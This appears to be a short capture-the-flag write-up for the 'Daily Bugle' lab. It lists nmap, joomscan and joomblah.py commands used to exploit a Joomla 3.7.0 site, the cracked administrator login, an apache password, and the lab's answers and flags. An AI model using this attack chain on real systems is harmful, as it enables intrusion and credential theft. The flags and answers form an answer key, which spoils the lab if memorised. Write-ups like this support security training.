# Daily Bugle

nmap scan
```
nmap -A -Pn -T5 10.10.246.202 -oN service-version.txt
```
joomscan install
```
git clone https://github.com/rezasp/joomscan.git                  
cd joomscan
perl joomscan.pl

```
joomblah.py download
```
https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py
```
run the joomblah.py
```
python3 joomblah.py http://10.10.246.202

```
## Deploy
| Questions | Answers |
|-----------|---------|
| Access the web server, who robbed the bank ? | spiderman |

## Obtain user and root

login to `http://10.10.246.202/administrator/` with `jonah:spiderman123`


found password for apache : nv5uz9r3ZEDzVjNu
| Questions | Answers |
|-----------|---------|
| What is the joomla version? | 3.7.0 |
| What is Jonah's cracked password ? | spiderman123 |
| What is the user flag? | 27a260fe3cba712cfdedb1c86d80442e |
| What is the root flag? | eec3d53292b1821868266858d7fa6f79 |


